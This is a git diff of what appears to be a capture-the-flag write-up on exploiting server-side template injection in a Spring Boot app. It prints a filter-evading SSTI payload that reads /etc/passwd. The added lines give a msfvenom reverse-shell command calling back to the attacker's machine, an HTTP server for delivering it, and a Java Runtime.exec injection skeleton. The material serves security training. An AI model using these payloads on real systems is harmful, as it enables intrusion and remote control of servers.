@@ -48,7 +48,16 @@ Oddly enough, the # (pound) symbol and * (star) have done the work and we can co
 Both mathematical operations 1+3+3+7 and 7+7 equals 14 we can tell that the payload got executed by the server, since we see the expected output.
 
 <h3>SSTI into RCE:</h3>
-The nmap scan reveals that the web application is powered by Spring Boot – so is it a Java application. Let's verify our payload by reading /etc/passwd. Use PayloadAllTheThings's Template Injection cheat sheet and find a suitable payload that bypasses the blacklist filter.<br>
+The nmap scan reveals that the web application is powered by Spring Boot – so is it a Java application. Let's verify our payload by reading /etc/passwd. Use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)'s Template Injection cheat sheet and find a suitable payload that bypasses the blacklist filter.<br>
 Hint: The payload won't work, unless we change the $ (dollar sign) to an * (asterisk).<br>
 
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+`${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`
+
+![image-1](https://user-images.githubusercontent.com/31168741/204106233-2b022041-c1d7-4155-86ab-91b8e5f3eacc.png)
+
+<h3>Reverse Shell</h3>
+Note: pentest.ws (Helps to create a reverse shell)
+The shell:<br>
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your-machine-ip] LPORT=1234 -f elf > rs.elf<br>
+Start your HTTP server in the same location as r.elf the reverse shell to the target machine: `python3 -m http.server 80`. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). 
+
